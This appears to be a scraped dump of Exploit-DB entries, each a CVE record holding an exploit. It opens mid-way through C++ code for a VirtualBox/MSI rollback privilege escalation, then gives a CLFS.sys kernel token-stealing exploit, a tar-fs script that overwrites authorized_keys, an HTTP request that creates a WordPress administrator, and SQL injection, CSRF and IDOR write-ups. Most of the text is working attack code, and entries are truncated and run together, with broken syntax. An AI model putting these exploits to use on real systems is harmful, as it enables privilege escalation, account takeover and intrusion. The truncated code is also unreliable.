%d\n"", GetLastError()); return FALSE; else printf(""[+] Junction %ls delete!\n"", dir); return TRUE; BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) { if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) { printf(""[+] Symlink %ls -> %ls created!\n"", object, target); return TRUE; else printf(""error :%d\n"", GetLastError()); return FALSE; BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) { if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) { printf(""[+] Symlink %ls -> %ls deleted!\n"", object, target); return TRUE; else printf(""error :%d\n"", GetLastError()); return FALSE; void runSDS(int delay) { if (delay == 1) { printf(""[!] sleeping for 2 sec\n""); Sleep(2000); CoInitialize(NULL); LPVOID ppv; CoCreateInstance(__uuidof(CLSID_VBoxSDS), 0, CLSCTX_LOCAL_SERVER, IID_IUnknown, &ppv); CoUninitialize(); BOOL checkSDSLog() { BOOL clear = FALSE; std::wstring vboxDataDir = L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log.*""; HANDLE hFind; WIN32_FIND_DATA data; hFind = FindFirstFile(LPCWSTR(vboxDataDir.c_str()), &data); FindNextFile(hFind, &data); if (hFind != INVALID_HANDLE_VALUE) { do { if (wcswcs(data.cFileName, L""VBoxSDS.log."")) { runSDS(0); else { printf(""[+] Logs have been cleared!\n""); clear = TRUE; } while (FindNextFile(hFind, &data)); FindClose(hFind); return clear; BOOL enumProc(const wchar_t* procName) { PWTS_PROCESS_INFO processes{}; BOOL ok = FALSE; DWORD count; if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &processes, &count)) { for (DWORD i = 0; i < count; i++) { if (wcswcs(processes[i].pProcessName, procName)) { wprintf(L""[!] Process active: %s with PID %d\n"", processes[i].pProcessName, processes[i].ProcessId); ok = TRUE; break; else { printf(""err: %d\n"", GetLastError()); WTSFreeMemory(processes); return ok; void checkIfExists() { if (enumProc(L""VirtualBoxVM.exe"")) { printf(""[!] You seem to have active VMs running, please stop them before running this to prevent corruption of any saved data of the VMs.\n""); exit(1); if (enumProc(L""VirtualBox.exe"")) { printf(""[!] VirtualBox process active\n""); printf(""[!] Trying to exit virtualbox by postmessage close window\n""); PostMessage(FindWindow(NULL, TEXT(""Oracle VM VirtualBox Manager"")), WM_CLOSE, NULL, NULL); printf(""[!] Letting VBoxSDS exit (wait 12 seconds)\n\n""); Sleep(12000); if (enumProc(L""VBoxSDS.exe"")) { printf(""[-] error stopping vboxsds\n""); exit(1); else { printf(""[+] Success stopping vboxsds!\n""); BOOL clearDataDir() { do { vb11 = CreateFile(L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log.11"", DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL); printf(""h: %x %d\n"", vb11, GetLastError()); } while (vb11 == INVALID_HANDLE_VALUE); oplock = FileOpLock::CreateLock(vb11, cb1); if (oplock != NULL) { HANDLE c = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runSDS, NULL, 0, NULL); oplock->WaitForLock(INFINITE); CloseHandle(c); BOOL isEmpty = FALSE; do { isEmpty = checkSDSLog(); } while (isEmpty == FALSE); if (!RemoveDirectory(L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log"")) { printf(""error removing vboxlog dir\n""); exit(1); return isEmpty; int wmain() { loadapis(); checkIfExists(); clearDataDir(); hFile = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF); if (hFile == INVALID_HANDLE_VALUE) printf(""[!] Failed to create C:\\Config.msi directory. Trying to delete it.\n""); install(NULL); hFile = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF); if (hFile != INVALID_HANDLE_VALUE) printf(""[+] Successfully removed and recreated C:\\Config.Msi.\n""); else printf(""[!] Failed. Cannot remove c:\\Config.msi""); if (!PathIsDirectoryEmpty(L""C:\\Config.Msi"")) printf(""[!] Failed. C:\\Config.Msi already exists and is not empty.\n""); printf(""[+] Config.msi directory created!\n""); HANDLE hDir = getDirectoryHandle(BuildPath(L""C:\\ProgramData\\VirtualBox""), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF); printf(""hDir: %x\n"", hDir); HANDLE zxc{}; zxc = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Monitor, hDir, 0, NULL); SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS); SetThreadPriorityBoost(GetCurrentThread(), TRUE); // This lets us maintain express control of our priority SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); oplock = FileOpLock::CreateLock(hFile, callback); if (oplock != nullptr) { oplock->WaitForLock(INFINITE); delete oplock; do { hFile = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF); } while (!hFile); char buff[4096]; DWORD retbt = 0; FILE_NOTIFY_INFORMATION* fn; WCHAR* extension; WCHAR* extension2; do { ReadDirectoryChangesW(hFile, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &retbt, NULL, NULL); fn = (FILE_NOTIFY_INFORMATION*)buff; size_t sz = fn->FileNameLength / sizeof(WCHAR); fn->FileName[sz] = '\0'; extension = fn->FileName; PathCchFindExtension(extension, MAX_PATH, &extension2); } while (wcscmp(extension2, L"".rbs"") != 0); SetSecurityInfo(hFile, SE_FILE_OBJECT, UNPROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL); while (!Move(hFile)) { HANDLE cfg_h = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE); WCHAR rbsfile[MAX_PATH]; _swprintf(rbsfile, L""C:\\Config.msi\\%s"", fn->FileName); HANDLE rbs = CreateFile(rbsfile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (WriteFile(rbs, RbsBuff, RbsSize, NULL, NULL)) { printf(""[+] Rollback script overwritten!\n""); else printf(""[!] Failed to overwrite rbs file!\n""); CloseHandle(rbs); CloseHandle(cfg_h); DeleteJunction(dir); CloseHandle(zxc); WCHAR asdfasdf[MAX_PATH]; _swprintf(asdfasdf, L""GLOBAL\\GLOBALROOT\\RPC Control\\%s"", filen); DelDosDeviceSymLink(asdfasdf, L""\\??\\C:\\Config.msi::$INDEX_ALLOCATION""); return 0; DWORD WINAPI install(void*) { HMODULE hm = GetModuleHandle(NULL); HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI1), L""msi""); wchar_t msipackage[MAX_PATH] = { 0x0 }; GetTempFileName(L""C:\\windows\\temp\\"", L""MSI"", 0, msipackage); printf(""[*] MSI file: %ls\n"", msipackage); DWORD MsiSize = SizeofResource(hm, res); void* MsiBuff = LoadResource(hm, res); HANDLE pkg = CreateFile(msipackage, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); WriteFile(pkg, MsiBuff, MsiSize, NULL, NULL); CloseHandle(pkg); MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL); UINT a = MsiInstallProduct(msipackage, L""ACTION=INSTALL""); printf(""%d\n"", a); MsiInstallProduct(msipackage, L""REMOVE=ALL""); DeleteFile(msipackage); return 0; BOOL Move(HANDLE hFile) { if (hFile == INVALID_HANDLE_VALUE) { printf(""[!] Invalid handle!\n""); return FALSE; wchar_t tmpfile[MAX_PATH] = { 0x0 }; RPC_WSTR str_uuid; UUID uuid = { 0 }; UuidCreate(&uuid); UuidToString(&uuid, &str_uuid); _swprintf(tmpfile, L""\\??\\C:\\windows\\temp\\%s"", str_uuid); size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t)); FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz); IO_STATUS_BLOCK io = { 0 }; rename_info->ReplaceIfExists = TRUE; rename_info->RootDirectory = NULL; rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040; rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t); memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t)); NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65); if (status != 0) { return FALSE; return TRUE; void callback() { SetThreadPriority(GetCurrentThread(), REALTIME_PRIORITY_CLASS); Move(hFile); hthread = CreateThread(NULL, NULL, install, NULL, NULL, NULL); HANDLE hd; do { hd = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN); } while (!hd); do { CloseHandle(hd); hd = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN); } while (hd); CloseHandle(hd); do { hd = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN); CloseHandle(hd); } while (retcode != 0xC0000022); HANDLE getDirectoryHandle(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) { UNICODE_STRING ufile; HANDLE hDir; pRtlInitUnicodeString(&ufile, file); OBJECT_ATTRIBUTES oa = { 0 }; IO_STATUS_BLOCK io = { 0 }; InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL); retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL); if (!NT_SUCCESS(retcode)) { return NULL; return hDir; LPWSTR BuildPath(LPCWSTR path) { wchar_t ntpath[MAX_PATH]; swprintf(ntpath, L""\\??\\%s"", path); return ntpath; void loadapis() { HMODULE ntdll = GetModuleHandle(L""ntdll.dll""); if (ntdll != NULL) { pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, ""RtlInitUnicodeString""); pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, ""NtCreateFile""); pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, ""NtSetInformationFile""); if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) { printf(""Cannot load api's %d\n"", GetLastError()); exit(0); void cb0() { if (!Move(h)) { printf(""reached3\n""); exit(1); printf(""reached2\n""); _swprintf(dir, L""C:\\ProgramData\\VirtualBox""); if (!CreateJunction(BuildPath(dir), L""\\RPC Control"")) { printf(""[!] Exiting!\n""); exit(1); WCHAR asdfasdf[MAX_PATH]; _swprintf(asdfasdf, L""GLOBAL\\GLOBALROOT\\RPC Control\\%s"", filen); if (!DosDeviceSymLink(asdfasdf, L""\\??\\C:\\Config.msi::$INDEX_ALLOCATION"")) { printf(""zxc\n""); void cb1() { printf(""[!] oplock triggered\n""); if (!Move(vb11)) { printf(""reached3\n""); exit(1); if (!CreateDirectory(L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log"", NULL)) { printf(""Error creating dir. Exiting\n""); exit(1); return; BOOL Monitor(HANDLE hDir) { printf(""[!] Monitor called\n""); BOOL deleted = FALSE; _swprintf(filen, L""VBoxSDS.log.11""); do { do { h = CreateFile(L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log.11"", DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL); printf(""h: %x\n"", h); } while (h == INVALID_HANDLE_VALUE); oplock = FileOpLock::CreateLock(h, cb0); if (oplock != NULL) { HANDLE c = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runSDS, (LPVOID)1, 0, NULL); oplock->WaitForLock(INFINITE); CloseHandle(c); deleted = TRUE; } while (deleted == FALSE); return deleted;"
CVE-2025-27533,2025-05-09,exploit db,"# Exploit Title: Apache ActiveMQ 6.1.6 - Denial of Service (DOS) # Date: 2025-05-9 # Exploit Author: [Abdualhadi khalifa (https://x.com/absholi7ly/) # Github: https://github.com/absholi7ly/CVE-2025-27533-Exploit-for-Apache-ActiveMQ # CVE: CVE-2025-27533 import socket import struct import time import datetime import threading import requests import argparse import random from colorama import init, Fore from tabulate import tabulate from tqdm import tqdm from concurrent.futures import ThreadPoolExecutor init() def print_banner(): banner = f"""""" {Fore.CYAN}============================================================ CVE-2025-27533 Exploit"
CVE-2025-2011,2025-05-09,exploit db,"# Exploit Title: WordPress Depicter Plugin 3.6.1 - SQL Injection # Google Dork: inurl:/wp-content/plugins/depicter/ # Date: 2025-05-06 # Exploit Author: Andrew Long (datagoboom) # Vendor Homepage: https://wordpress.org/plugins/depicter/ # Software Link: https://downloads.wordpress.org/plugin/depicter.3.6.1.zip # Version: <= 3.6.1 # Tested on: WordPress 6.x # CVE: CVE-2025-2011 # Description: # The Slider & Popup Builder by Depicter plugin for WordPress is vulnerable to SQL Injection via the 's' parameter in all versions up to, and including, 3.6.1. # The vulnerability exists due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. # This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. # The vulnerability is located in the admin-ajax.php endpoint and can be exploited through the 's' parameter. The"
CVE-2025-27007,2025-05-09,exploit db,"# Exploit Title: SureTriggers OttoKit Plugin 1.0.82 - Privilege Escalation # Date: 2025-05-7 # Exploit Author: [Abdualhadi khalifa (https://x.com/absholi7ly/) # Affected: Versions All versions of OttoKit (SureTriggers) ≤ 1.0.82. Conditions for Exploitation The vulnerability can be exploited under the following circumstances: 1. OttoKit must be installed and activated on the target WordPress site. 2. The plugin *uninitialized* (e.g., no API key or ""secret_key"" is set in the database). 3. The target site displays the REST API endpoint '/wp-json/sure-triggers/v1/automation/action'. HTTP Request The following request targets the /wp-json/sure-triggers/v1/automation/action endpoint to create an administrator account: POST /wp-json/sure-triggers/v1/automation/action HTTP/1.1 Host: [target-site] Content-Type: application/x-www-form-urlencoded St-Authorization: Content-Length: [length] selected_options[user_name]=new_admin&selected_options[user_email]= attacker@example.com&selected_options[password]=StrongP@ssw0rd123 &selected_options[role]=administrator&aintegration=WordPress&type_event=create_user_if_not_exists"
CVE-2025-47226,2025-05-06,exploit db,"# Exploit Title: Grokability Snipe-IT 8.0.4 - Insecure Direct Object Reference (IDOR) # Google Dork: N/A # Date: 2025-05-02 # Exploit Author: Sn1p3r-H4ck3r (Siripong Jintung) # Vendor Homepage: https://snipeitapp.com # Software Link: https://github.com/grokability/snipe-it # Version: <= 8.0.4 # Tested on: Ubuntu 22.04 LTS, Apache2 + MySQL + PHP 8.1 # CVE: CVE-2025-47226 # Vulnerability Description: Snipe-IT <= 8.0.4 contains an Insecure Direct Object Reference (IDOR) vulnerability in the `/locations/ /printassigned` endpoint. This flaw allows an authenticated user from one department to gain access to asset assignment data belonging to other departments by modifying the `location_id` in the URL. # Steps to Reproduce: 1. Authenticate with a low-privileged account assigned to `location_id = 2`. 2. Access the print preview page: https:// /locations/2/printassigned 3. Modify the URL to: https:// /locations/1/printassigned 4. The application will disclose inventory/assignment information for location ID 1, even if the user should not have access. # Impact: - Unauthorized access to internal asset and inventory information. - Potential for lateral data exposure between departments in the same organization. - Disclosure of asset IDs, assignees, and location metadata. # Mitigation: Update to **Snipe-IT v8.1.0** or higher where access control validation has been corrected. # References: - Patch PR: https://github.com/grokability/snipe-it/pull/16672 - CVE Record: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47226 - Release Notes: https://github.com/grokability/snipe-it/releases/tag/v8.1.0"
CVE-2025-28062,2025-05-06,exploit db,"# Exploit Title: ERPNext 14.82.1 - Account Takeover via Cross-Site Request Forgery (CSRF) # Google Dork: inurl:""/api/method/frappe"" # Date: 2025-04-29 # Exploit Author: Ahmed Thaiban (Thvt0ne) # Vendor Homepage: https://erpnext.com # Software Link: https://github.com/frappe/erpnext # Version: <= 14.82.1, 14.74.3 (Tested) # Tested on: Linux (Ubuntu 20.04), Chrome, Firefox. # CVE : CVE-2025-28062 # Category: WebApps # Description: A Cross-Site Request Forgery (CSRF) vulnerability Lead to Account Takeover exists in ERPNext 14.82.1 and 14.74.3. This flaw allows an attacker to perform unauthorized state-changing operations on behalf of a logged-in administrator without their knowledge or consent. Affected endpoints include: - /api/method/frappe.desk.reportview.delete_items - /api/method/frappe.desk.form.save.savedocs Impact: - Deletion of arbitrary users - Unauthorized role assignment - Account takeover via password change The application fails to enforce CSRF tokens on administrative API requests, violating OWASP recommendations."
CVE-2025-24054,2025-05-01,exploit db,"# Exploit title: Microsoft - NTLM Hash Disclosure Spoofing (library-ms) # Exploit Author: John Page (aka hyp3rlinx) # x.com/hyp3rlinx # ISR: ApparitionSec Back in 2018, I reported a "".library-ms"" File NTLM information disclosure vulnerability to MSRC and was told ""it was not severe enough"", that being said I post it anyways. Seven years passed, until other researchers re-reported it. Subsequently this security flaw was finally deemed important by Microsoft and it received CVE-2025-24054, for which I was finally retroactively credited as the original reporter. Circa 2025 updated: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054 [References] https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt https://packetstorm.news/files/id/148556/ https://cxsecurity.com/issue/WLB-2018070160 [Network Access] Remote [Original Disclosure Timeline] Vendor Notification: Jun 29, 2018 MSRC Response: Jul 12, 2018 ""risk is not severe enough to justify immediate servicing."" July 14, 2018 : Public Disclosure [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content copyright (c). hyp3rlinx"
CVE-2024-42471,2025-04-30,exploit db,"# Exploit Title: unzip-stream 0.3.1 - Arbitrary File Write # Date: 18th April, 2024 # Exploit Author: Ardayfio Samuel Nii Aryee # Software link: https://github.com/mhr3/unzip-stream # Version: unzip-stream 0.3.1 # Tested on: Ubuntu # CVE: CVE-2024-42471 # NB: Python's built-in `zipfile` module has limitations on the `arcname` parameter. # To bypass this restriction, edit the module's source code (`zipfile.py`) and comment out the following line: # arcname = os.path.normpath(os.path.splitdrive(arcname)[1]) # For a more detailed explanation, feel free to check out my blog post here: https://themcsam.github.io/posts/unzip-stream-"
CVE-2024-12905,2025-04-22,exploit db,"# Exploit Title: tar-fs 3.0.0 - Arbitrary File Write/Overwrite # Date: 17th April, 2024 # Exploit Author: Ardayfio Samuel Nii Aryee # Software link: https://github.com/mafintosh/tar-fs # Version: tar-fs 3.0.0 # Tested on: Ubuntu # CVE: CVE-2024-12905 # Run the command: Example: python3 exploit.py authorized_keys ../../../../../../../../home/user1/authorized_keys # This will generate two tar file: stage_1.tar and stage_2.tar # Upload stage_1.tar first to unarchive the symlink # Next, upload stage_2.tar to finally write/overwrite the file on the system import os import sys import tarfile link_name = ""normal_file"" def check_arguments(): if len(sys.argv) != 3: print(f""Usage: {sys.argv[0]} \n\ Example: {sys.argv[0]} authorized_keys ../../../../../../../../home/user1/authorized_keys\ sys.exit() content_file_path = sys.argv[1] target_file_path = sys.argv[2] return content_file_path, target_file_path def create_symlink(link_name, target_path): os.symlink(target_path, link_name) print(""[+] Created symlink: {link_name} -> {target_path}"") def archive_files(archive_name, file_path): tar = tarfile.open(archive_name, 'w') tar.add(file_path, link_name, recursive=False) tar.close() print(f""[+] Archived to: {archive_name}"") def main(): content_path, target_file = check_arguments() stage_1_archive_name = ""stage_1.tar"" stage_2_archive_name = ""stage_2.tar"" create_symlink(link_name, target_file) archive_files(stage_1_archive_name, link_name) archive_files(stage_2_archive_name, content_path) if __name__ == ""__main__"": main()"
CVE-2024-49138,2025-04-22,exploit db,"# Exploit Title: Microsoft Windows 11 23h2 - CLFS.sys Elevation of Privilege # Date: 2025-04-16 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # MiRROR-H: https://mirror-h.org/search/hacker/49626/ # CVE: CVE-2024-49138 #include #include #include #include #include #include #include #include #include #include #include ""resource.h"" #define CONTROL_BLOCK_SIZE 0x400 #define OFFSET_EXTENDED_STATE 0x84 #define OFFSET_IEXTENDED_BLOCK 0x88 #define OFFSET_IFLUSHB_BLOCK 0x8c #define _CRT_SECURE_NO_WARNINGS 1 #define POFXPROCESSORNOTIFICATION_OFFSET 0x3aebb0 #define DBGKPTRIAGEDUMPRESTORESTATE_OFFSET 0x7f06a0 #define PSACTIVEPROCESSHEAD_OFFSET 0xc37f60 #define ACTIVEPROCESSLINKS_OFFSET 0x448 #define UNIQUEPROCESSID_OFFSET 0x440 #define TOKEN_OFFSET 0x4b8 #define TOKENPRIVILEGESPRESENT_OFFSET 0x40 #define TOKENPRIVILEGSENABLED_OFFSET 0x48 #pragma comment(lib, ""Clfsw32.lib"") LPVOID GetKernelBaseAddress() { LPVOID drivers[1024]; // Array to hold driver addresses DWORD cbNeeded; // Bytes returned by EnumDeviceDrivers int driverCount; TCHAR driverName[MAX_PATH]; if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) { printf(""Failed to enumerate device drivers. Error: %lu\n"", GetLastError()); return (LPVOID)0x0; driverCount = cbNeeded / sizeof(drivers[0]); if (driverCount == 0) { printf(""No device drivers found.\n""); return (LPVOID)0x0; LPVOID kernelBaseAddress = drivers[0]; if (GetDeviceDriverBaseName(kernelBaseAddress, driverName, MAX_PATH)) { printf(""Kernel Base Address: 0x%p\n"", kernelBaseAddress); printf(""Kernel Name: %ls\n"", driverName); else { printf(""Failed to retrieve kernel name. Error: %lu\n"", GetLastError()); return kernelBaseAddress; #define SystemHandleInformation 0x10 #define SystemHandleInformationSize 1024 * 1024 * 2 using fNtQuerySystemInformation = NTSTATUS(WINAPI*)( ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength using fNtReadVirtualMemory = NTSTATUS(WINAPI*)( HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesRead); using fNtWriteVirtualMemory = NTSTATUS(WINAPI*)( HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten); fNtReadVirtualMemory NtReadVirtualMemory = NULL; fNtWriteVirtualMemory NtWriteVirtualMemory = NULL; typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO USHORT UniqueProcessId; USHORT CreatorBackTraceIndex; UCHAR ObjectTypeIndex; UCHAR HandleAttributes; USHORT HandleValue; PVOID Object; ULONG GrantedAccess; } SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO; typedef struct _SYSTEM_HANDLE_INFORMATION ULONG NumberOfHandles; SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1]; } SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION; PVOID GetKAddrFromHandle(HANDLE handle) { ULONG returnLength = 0; fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtQuerySystemInformation""); PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize); NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLength); ULONG numberOfHandles = handleTableInformation->NumberOfHandles; HeapFree(GetProcessHeap(), 0, handleTableInformation); handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) + sizeof(SYSTEM_HANDLE_INFORMATION) + 0x100); NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) + sizeof(SYSTEM_HANDLE_INFORMATION) + 0x100, &returnLength); for (int i = 0; i < handleTableInformation->NumberOfHandles; i++) SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i]; if (handleInfo.HandleValue == (USHORT)handle && handleInfo.UniqueProcessId == GetCurrentProcessId()) return handleInfo.Object; LPVOID g_ntbase = 0; LPVOID address_to_write; DWORD64 value_to_write = 0x0014000000000f00; PSACTIVEPROCESSHEAD_OFFSET), &eprocess, sizeof(eprocess), NULL); &systemtoken, sizeof(systemtoken), NULL); ACTIVEPROCESSLINKS_OFFSET), &eprocess, sizeof(eprocess), NULL); UNIQUEPROCESSID_OFFSET), &pid, sizeof(pid), NULL); &currenttoken, sizeof(currenttoken), NULL); TOKENPRIVILEGESPRESENT_OFFSET), &privileges, 0x8, NULL); TOKENPRIVILEGSENABLED_OFFSET), &privileges, 0x8, NULL); &systemtoken, 0x8, NULL); int main() HMODULE hModule; HRSRC hResource; errno_t err; HGLOBAL hLoadedResource; LPVOID pResourceData; DWORD resourceSize; FILE* file; DWORD sectorsPerCluster; DWORD bytesPerSector; DWORD numberOfFreeClusters; DWORD totalNumberOfClusters; const char* rootPath = ""C:\\""; PVOID marshallingArea = NULL; ULONGLONG pcbContainer = 0; std::wstring logFileName = L""LOG:""; std::wstring inputName = L""C:\\temp\\testlog\\mylogdddd.blf""; logFileName += inputName; DWORD64 buf = 0; ULONG bytesRead = 0; LPVOID PreviousModeAddr = NULL; DWORD threadId = GetCurrentThreadId(); // Get the current thread ID DWORD64 eprocess = 0; DWORD64 systemtoken = 0; DWORD64 currenttoken = 0; DWORD64 pid = 0; BYTE PreviousMode = 0x1; DWORD64 privileges = 0x0000001ff2ffffbc; const char* directoryName1 = ""C:\\temp""; const char* directoryName2 = ""C:\\temp\\testlog""; HANDLE logHndl = INVALID_HANDLE_VALUE; ULONGLONG cbContainer = (ULONGLONG)0x80000; if (CreateDirectoryA(directoryName1, NULL)) { printf(""Directory created successfully: %s\n"", directoryName1); else { DWORD error = GetLastError(); if (error == ERROR_ALREADY_EXISTS) { printf(""The directory already exists: %s\n"", directoryName1); else { printf(""Failed to create the directory. Error code: %lu\n"", error); return 0; if (CreateDirectoryA(directoryName2, NULL)) { printf(""Directory created successfully: %s\n"", directoryName2); else { DWORD error = GetLastError(); if (error == ERROR_ALREADY_EXISTS) { printf(""The directory already exists: %s\n"", directoryName2); else { printf(""Failed to create the directory. Error code: %lu\n"", error); return 0; logHndl = CreateLogFile(logFileName.c_str(), GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0); if (logHndl == INVALID_HANDLE_VALUE) { printf(""CreateLogFile failed with error %d\n"", GetLastError()); return 0; else { printf(""file opened successfully\n""); if (!AddLogContainer(logHndl, &cbContainer, (LPWSTR)L""C:\\temp\\testlog\\container1"", NULL)) { printf(""AddLogContainer failed with error %d\n"", GetLastError()); else { printf(""AddLogContainer successful\n""); CloseHandle(logHndl); hModule = GetModuleHandle(NULL); if (!hModule) { printf(""Failed to get module handle.\n""); return 1; hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA); if (!hResource) { printf(""Failed to find resource. Error: %lu\n"", GetLastError()); return 1; printf(""hResource = 0x%p\n"", hResource); hLoadedResource = LoadResource(hModule, hResource); if (!hLoadedResource) { printf(""Failed to load resource. Error: %lu\n"", GetLastError()); return 1; printf(""hResource = 0x%p\n"", hLoadedResource); pResourceData = LockResource(hLoadedResource); if (!pResourceData) { printf(""Failed to lock resource. Error: %lu\n"", GetLastError()); return 1; printf(""pResourceData = 0x%p\n"", pResourceData); resourceSize = SizeofResource(hModule, hResource); if (resourceSize == 0) { printf(""Failed to get resource size. Error: %lu\n"", GetLastError()); return 1; resourceSize contains its size printf(""Resource size: %lu bytes\n"", resourceSize); err = fopen_s(&file, ""C:\\temp\\testlog\\mylogdddd.blf.blf"", ""wb""); if (err == 0 && file) { fwrite(pResourceData, 1, resourceSize, file); fclose(file); printf(""Resource written to output.bin successfully.\n""); else { printf(""Failed to open output file. Error code: %d\n"", err); g_ntbase = GetKernelBaseAddress(); NtReadVirtualMemory = (fNtReadVirtualMemory)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtReadVirtualMemory""); NtWriteVirtualMemory = 